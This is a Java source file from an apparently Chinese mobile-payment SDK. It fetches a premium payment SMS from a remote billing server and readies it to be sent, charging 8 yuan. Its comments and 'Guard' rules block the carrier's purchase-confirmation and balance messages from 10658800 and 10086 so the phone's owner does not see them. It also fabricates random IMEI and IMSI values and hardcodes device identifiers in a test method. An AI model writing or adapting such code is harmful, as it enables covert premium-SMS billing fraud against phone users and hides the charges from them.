package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

/**
 * 使用http get 模式访问http://a.waapoh.com/mm-interface/mm.jsp?cpId=xxxx&imei=898601234567811&imsi=460001234567811&chargeId=xxxx

备注： cpId 由我方提供，chargeId计费id又我方提供

chargeId                 价格（元） 
10346                  8元
cpId  可以忽略

1、	访问后：
  返回内容 “error”  则获取失败。 否则 则成功"1065842410<:>ZP#1QN8Y#1DM4LUO#4J21NE6JK3#8UIZPHV5HF#1ZA1YJ#AMU78YL7H#463A5D5FDD82108F#31958B8E6CE6D00D#<:>10658800@10086<:>划石成钻@游戏"
备注：以“<:>”这个作为分割字符串
1065842410  这个是发送端口号；

ZP#1QN8Y#1DM4LUO#4J21NE6JK3#8UIZPHV5HF#1ZA1YJ#AMU78YL7H#463A5D5FDD82108F#31958B8E6CE6D00D#  这个是发送支付短信；

10658800@10086 是支付成功下行端口号   存在多个端口号以“@”做为分割 需要屏蔽;

划石成钻@游戏  是支付成功下行短信中的关键字以“@”做为分割  需要屏蔽；
 * @author leoliu
 *
 */
public class XmwtMm1DynamicService implements IDynamicService{

	private static final String TYPE = "xmwtMm1";

	private static final String REQUESTMODEL = "cpId=1&imei={imei}&imsi={imsi}&chargeId={chargeId}";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 10;
	
	private static final Guard guard1 = new Guard("10658800","成功购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	private int timeOut = 60;
	
	private Map<String, Long> tryMap = new HashMap<String, Long>();
	@Override
	public String getType() {
		return TYPE;
	}

	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = map.get("imsi");
			String imei = map.get("imei");
			String chargeId = map.get("chargeId");
			
			if(imsi == null || imsi.length() == 0){
				imsi = fillImei("46000");
			}
			
			if(imei == null || imei.length() == 0){
				imei = fillImei("");
			}
			
			String requestParam = REQUESTMODEL.replace("{imei}", imei).replace("{imsi}",imsi).replace("{chargeId}",chargeId);
			
			String responseTxt = GetData.getData(url,requestParam);
			
			xml = parseXml(responseTxt);
			
			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parseXml(String responseTxt){
		
		if(responseTxt != null && responseTxt.length() > 0){
			try{
				String[] arr = responseTxt.split("<:>");
				
				if(arr.length >= 2){
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(arr[1]);
					sms.setSmsDest(arr[0]);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
						
					return XstreamHelper.toXml(smsList);
					
				}
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	private String fillImei(String imei){
		if(imei.length() < 15){
			int len = imei.length();
			
			for(int i = 0 ; i < 15 - len ; i ++){
				imei += new Random().nextInt(10);
			}
		}
		
		return imei;
	}

	public static void main(String[] args){
		
		String url = "http://a.waapoh.com/mm-interface/mm.jsp";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B9KTa100546110");
		map.put("chargeId", "10346");
		map.put("imsi","460029647996597");
		map.put("imei","861032021390142");
		
		System.out.println(new XmwtMm1DynamicService().dynamic(map));
		
		
		
	}
}
